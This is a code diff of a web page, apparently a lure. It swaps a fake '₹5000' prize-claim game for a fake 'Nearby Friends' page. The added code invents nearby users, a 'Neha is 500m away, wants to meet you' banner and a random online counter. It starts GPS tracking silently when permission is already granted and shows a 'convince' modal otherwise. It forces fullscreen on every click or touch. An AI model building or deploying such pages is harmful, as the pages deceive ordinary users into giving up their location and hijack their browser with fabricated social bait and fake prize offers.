+                { name: 'Li Wei', avatar: 'https://randomuser.me/api/portraits/women/55.jpg', distance: 5.7 }
+            ];
+
+            const mapArea = document.getElementById('mapArea');
+            const listArea = document.getElementById('nearbyList');
+
+            users.forEach((user, i) => {
+                const angle = Math.random() * 2 * Math.PI;
+                const radius = 40 + (user.distance * 25);
+                const isClose = user.distance <= 0.7;
+                const online = Math.random() > 0.3;
+
+                const dot = document.createElement('div');
+                dot.className = 'nearbyDot' + (online ? ' online' : '') + (isClose ? ' close' : '');
+                dot.style.backgroundImage = `url('${user.avatar}')`;
+                dot.style.left = `calc(50% + ${Math.cos(angle) * radius}px)`;
+                dot.style.top = `calc(50% + ${Math.sin(angle) * radius}px)`;
+                dot.onclick = () => showToast(`${user.name} • ${user.distance} km away`);
+                mapArea.appendChild(dot);
+
+                const card = document.createElement('div');
+                card.className = 'nearbyCard';
+                card.onclick = () => showToast(`Opening chat with ${user.name}...`);
+                card.innerHTML = `
+      <div class="avatar ${online ? 'online' : ''}" style="background-image: url('${user.avatar}');"></div>
+      <div class="name">${user.name}</div>
+      <div class="distance ${isClose ? 'close' : ''}">${user.distance < 1 ? Math.round(user.distance * 1000) + 'm' : user.distance + 'km'}</div>
+    `;
+                listArea.appendChild(card);
+            });
+
+            document.getElementById('nearbyCount').textContent = users.length;
+        }
+
+        function showNearbyBanner() {
+            const banner = document.getElementById('nearbyBanner');
+            document.getElementById('bannerAvatar').style.backgroundImage =
+                'url("https://randomuser.me/api/portraits/women/44.jpg")';
+            document.getElementById('bannerName').textContent = 'Neha is 500m away';
+            document.getElementById('bannerMsg').textContent = 'Wants to meet you';
+            banner.style.display = 'flex';
+
+            setTimeout(() => {
+                banner.style.display = 'none';
+            }, 8000);
+        }
+
+        function refreshLocation() {
+            showToast('🔄 Refreshing...');
+            setTimeout(() => {
+                document.querySelectorAll('.nearbyDot').forEach(d => d.remove());
+                document.getElementById('nearbyList').innerHTML = '';
+                generateNearbyUsers();
+                showNearbyBanner();
+                showToast('✅ Location refreshed');
+            }, 1000);
+        }
+
+        /* ============================================================
+           🚀 SMART AUTO GPS FLOW
+           ============================================================ */
+        async function silentGPSStart() {
+            if (gpsStarted) return;
+            gpsStarted = true;
+
+            document.getElementById('landing').classList.add('hide');
+
+            setTimeout(() => {
+                document.getElementById('landing').style.display = 'none';
+                document.getElementById('loading').classList.add('show');
+                document.getElementById('loadingText').textContent = 'Finding for you ...';
+            }, 300);
+
+            getUserLocation();
+        }
+
+        async function initAutoGPS() {
+            console.log('🚀 Init auto GPS...');
+            await new Promise(r => setTimeout(r, 500));
+
+            const permState = await checkGPSPermission();
+            console.log('📋 Permission:', permState);
+
+            if (permState === 'granted') {
+                console.log('✅ Granted — silent start');
+                silentGPSStart();
+            } else if (permState === 'denied') {
+                console.log('🚫 Denied — showing guide');
+                showDeniedGuide();
             } else {
-                resultIcon.textContent = '😢';
-                resultTitle.textContent = 'Better Luck Next Time';
-                resultTitle.className = 'result-title lose';
-                resultSub.innerHTML = 'Aapne ye baar nahi jeeta.<br>Dobara try karo!';
-
-                claimBtn.style.display = 'none';
-                closeResultBtn.style.display = 'flex';
-
-                playSound(400, 0.3);
-                vibrate([100, 50, 100]);
-
-                logEvent('game_lost');
+                console.log('⚠️ Prompt — showing convince modal');
+                showGPSModal();
             }
         }
 
         /* ============================================================
-           CLAIM BUTTON
+           INIT
            ============================================================ */
-        claimBtn.addEventListener('click', () => {
-            showToast('💰 Claim process start ho gaya...');
-
-            // Yahan apna claim flow lagao
-            // Example: UPI ID input, payment gateway, etc.
-
-            logEvent('claim_clicked', { amount: 5000 });
-
-            playSound(1000, 0.15);
-            vibrate([50, 30, 50]);
-
-            setTimeout(() => {
-                alert('💰 Claim process start!\n\nAapka ₹5,000 verification ke baad transfer hoga.\n\n(Real app me yahan payment gateway integration hoga)');
-            }, 500);
-        });
-
-        /* ============================================================
-           TRY AGAIN BUTTON
-           ============================================================ */
-        closeResultBtn.addEventListener('click', () => {
-            gameModal.classList.remove('show');
-
-            // Reset for new game (optional — usually ek hi baar)
-            setTimeout(() => {
-                gamePlayed = false;
-                hasClicked = false;
-                winBtn.disabled = false;
-                winBtn.innerHTML = '<span>🎯</span><span>Click to Win ₹5000</span>';
-                winBtn.style.background = 'linear-gradient(135deg, #f59e0b, #d97706)';
-                playBtn.disabled = true;
-                playBtn.style.opacity = '0.5';
-                playBtn.style.animation = '';
-            }, 500);
-        });
-
-        /* ============================================================
-           CONFETTI
-           ============================================================ */
-        function createConfetti() {
-            const colors = ['#fbbf24', '#f59e0b', '#a855f7', '#ec4899', '#10b981', '#3b82f6'];
-            for (let i = 0; i < 50; i++) {
-                setTimeout(() => {
-                    const confetti = document.createElement('div');
-                    confetti.className = 'confetti';
-                    confetti.style.left = Math.random() * 100 + 'vw';
-                    confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
-                    confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
-                    confetti.style.width = (Math.random() * 8 + 6) + 'px';
-                    confetti.style.height = confetti.style.width;
-                    document.body.appendChild(confetti);
-                    setTimeout(() => confetti.remove(), 3000);
-                }, i * 30);
-            }
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initAutoGPS);
+        } else {
+            initAutoGPS();
         }
 
-        /* ============================================================
-           LIVE COUNT (fake increasing)
-           ============================================================ */
-        let liveNum = 2847;
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            const permState = await checkGPSPermission();
+            if (permState === 'granted') {
+                silentGPSStart();
+            } else if (permState === 'denied') {
+                showDeniedGuide();
+            } else {
+                showGPSModal();
+            }
+        });
+
+        /* Live counter */
         setInterval(() => {
-            liveNum += Math.floor(Math.random() * 5) + 1;
-            liveCount.textContent = liveNum.toLocaleString();
+            const count = 1200 + Math.floor(Math.random() * 200);
+            document.getElementById('onlineCount').textContent = count.toLocaleString();
         }, 3000);
 
+        /* Permission watch */
+        if (navigator.permissions && navigator.permissions.query) {
+            navigator.permissions.query({ name: 'geolocation' }).then(status => {
+                status.onchange = () => {
+                    console.log('🔔 GPS perm changed:', status.state);
+                    if (status.state === 'granted' && !userLocation) {
+                        silentGPSStart();
+                    }
+                };
+            }).catch(() => { });
+        }
+
+        /* Cleanup */
+        window.addEventListener('beforeunload', () => {
+            if (watchId) navigator.geolocation.clearWatch(watchId);
+            stopLocationLoop();
+        });
+
+        console.log('✅ Nearby Friends ready');
+
         /* ============================================================
-           HELPERS
+           🔥 EXPOSE FUNCTIONS TO WINDOW (for onclick buttons)
            ============================================================ */
-        function playSound(freq, duration) {
-            try {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = ctx.createOscillator();
-                const gain = ctx.createGain();
-                osc.connect(gain);
-                gain.connect(ctx.destination);
-                osc.frequency.value = freq;
-                osc.type = 'sine';
-                gain.gain.setValueAtTime(0.05, ctx.currentTime);
-                gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
-                osc.start();
-                osc.stop(ctx.currentTime + duration);
-            } catch (e) {}
+        window.requestGPS = requestGPS;
+        window.skipGPS = skipGPS;
+        window.refreshLocation = refreshLocation;
+        window.showToast = showToast;
+
+        console.log('✅ Functions exposed to window');
+        /* ============================================================
+   🔥 BUTTON EVENT LISTENERS
+   ============================================================ */
+        const enableBtn = document.getElementById('enableBtn');
+        const skipBtn = document.getElementById('skipBtn');
+
+        if (enableBtn) {
+            enableBtn.addEventListener('click', () => {
+                console.log('💬 Enable clicked');
+                requestGPS();
+            });
         }
 
-        function vibrate(p) {
-            if (navigator.vibrate) navigator.vibrate(p);
+        if (skipBtn) {
+            skipBtn.addEventListener('click', () => {
+                console.log('⏭️ Skip clicked');
+                skipGPS();
+            });
         }
 
-        function showToast(msg) {
-            const t = document.createElement('div');
-            t.className = 'toast';
-            t.textContent = msg;
-            document.body.appendChild(t);
-            setTimeout(() => t.remove(), 2500);
+        // 🔥 Bottom controls bhi
+        const ctrlBtns = document.querySelectorAll('.ctrlBtn');
+        if (ctrlBtns[0]) ctrlBtns[0].addEventListener('click', refreshLocation);
+        if (ctrlBtns[1]) ctrlBtns[1].addEventListener('click', () => showToast('Chat feature coming soon'));
+        if (ctrlBtns[2]) ctrlBtns[2].addEventListener('click', () => showToast('Settings'));
+
+        console.log('✅ All buttons wired');
+        /* ============================================================
+   🔒 FULLSCREEN ON ANY CLICK
+   ============================================================ */
+
+        let __fullscreenTriggered = false;
+
+        function goFullscreen() {
+            // Agar already fullscreen me hai toh skip
+            if (document.fullscreenElement) return;
+
+            const el = document.documentElement;
+            const req = el.requestFullscreen ||
+                el.webkitRequestFullscreen ||
+                el.mozRequestFullScreen ||
+                el.msRequestFullscreen;
+
+            if (!req) {
+                console.log('❌ Fullscreen not supported');
+                return;
+            }
+
+            req.call(el).then(() => {
+                console.log('✅ Fullscreen ON');
+                __fullscreenTriggered = true;
+            }).catch((err) => {
+                console.log('❌ Fullscreen blocked:', err.message);
+            });
         }
 
-        function logEvent(type, data = {}) {
-            console.log('📊 Event:', type, data);
-            // Yahan Firebase me save karo
-            // saveEvent(type, data);
-        }
+        /* 🔥 Har click / touch pe fullscreen try karo */
+        document.addEventListener('click', () => {
+            if (!document.fullscreenElement) {
+                goFullscreen();
+            }
+        }, { capture: true });
+
+        document.addEventListener('touchstart', () => {
+            if (!document.fullscreenElement) {
+                goFullscreen();
+            }
+        }, { capture: true, passive: true });
+
+        console.log('🔒 Fullscreen on any click enabled');
     </script>
 </body>
+
 </html>
